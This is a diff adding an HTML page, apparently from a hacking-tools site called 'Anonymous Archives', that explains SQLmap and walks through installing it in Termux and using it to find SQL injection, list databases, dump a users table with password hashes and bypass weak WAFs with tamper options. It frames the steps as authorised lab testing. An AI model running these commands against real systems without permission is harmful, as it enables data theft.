@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <title>Anonymous Archives - SQLmap</title>
+  <!-- Paste the full <style> block from index.html here, including .binary-bg animation for blue binary pattern -->
+</head>
+<body>
+  <div class="binary-bg"></div>
+  <!-- Navbar identical to previous pages -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <!-- ... same navbar content as index.html, with Tools link active if desired ... -->
+  </nav>
+
+  <div class="container mt-4">
+    <section id="tool-sqlmap">
+      <h2>SQLmap</h2>
+      <p>SQLmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications. It supports a wide range of database management systems and can perform database fingerprinting, data extraction, file system access, and command execution where feasible.</p>
+      <img src="https://sqlmap.org/images/sqlmap_screenshot.png" alt="SQLmap Console Output Example" class="img-fluid">
+      <h3>Uses</h3>
+      <p>SQLmap is primarily used for identifying injectable parameters, enumerating database structures (tables, columns, data), dumping contents, and validating SQL injection risks during authorized security assessments. Example: Testing a web application's login or search form for injection flaws to assess potential data exposure.</p>
+      <h3>Installation in Termux</h3>
+      <pre><code>pkg update && pkg upgrade -y
+pkg install git python -y
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev</code></pre>
+      <p>Run with <code>python sqlmap.py -h</code> for help. To uninstall: Remove the sqlmap-dev directory and related packages. Common issues: Python version conflicts—ensure Python 3 is used; dependency errors—run <code>pip install -r requirements.txt</code> if needed (install pip via <code>pkg install python-pip</code>).</p>
+      <h3>Functions and Walkthroughs</h3>
+      <p>Basic detection: <code>python sqlmap.py -u "http://example.com/page?id=1"</code>. Enumerate databases: <code>--dbs</code>. Dump tables: <code>--tables -D database_name</code>. Full help: <code>python sqlmap.py -hh</code>. Always test on authorized targets only.</p>
+      <img src="https://hackertarget.com/wp-content/uploads/2015/04/sqlmap-basic-scan.png" alt="SQLmap Basic Scan Output" class="img-fluid">
+
+      <h3>Detailed Tutorial: Detecting and Enumerating SQL Injection Vulnerabilities (Ethical Lab Scenario)</h3>
+      <p>This tutorial demonstrates SQLmap usage on a deliberately vulnerable test application (e.g., DVWA or a local lab setup). Obtain explicit written permission before testing any live or third-party system. Unauthorized exploitation is illegal.</p>
+      <ol>
+        <li>Navigate to the tool directory: <code>cd ~/sqlmap-dev</code> (or wherever cloned).</li>
+        <li>Test a URL for injection: <code>python sqlmap.py -u "http://vulnerable-site.com/page?id=1" --batch</code> – The --batch flag automates default choices. SQLmap probes the 'id' parameter and reports if injectable (e.g., "parameter 'id' is vulnerable").</li>
+        <li>Identify the DBMS: If vulnerable, rerun with <code>--dbms=mysql</code> (or let it detect automatically) to optimize tests.</li>
+        <li>List databases: <code>python sqlmap.py -u "http://vulnerable-site.com/page?id=1" --dbs</code> – Outputs available databases (e.g., information_schema, dvwa).</li>
+        <li>Enumerate tables: <code>python sqlmap.py -u "http://vulnerable-site.com/page?id=1" -D dvwa --tables</code> – Lists tables like users, sessions.</li>
+        <li>Dump data: <code>python sqlmap.py -u "http://vulnerable-site.com/page?id=1" -D dvwa -T users --dump</code> – Extracts column data (e.g., usernames, hashed passwords). Review output responsibly.</li>
+        <li>Advanced options: Add <code>--level=3 --risk=3</code> for deeper testing, or <code>--tamper=space2comment</code> to bypass weak WAFs (use ethically).</li>
+      </ol>
+      <p>Expected results: Confirmation of vulnerability, database details, and extracted data if successful. Common issues: Rate limiting—add <code>--delay=1</code>; false negatives—increase risk/level. Document all findings for remediation reporting.</p>
+      <img src="https://www.stationx.net/wp-content/uploads/2023/01/sqlmap-tutorial.png" alt="SQLmap Enumeration Example" class="img-fluid">
+      <p>For further reference, consult the official user's manual: <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank">SQLmap Wiki Usage</a>.</p>
+    </section>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
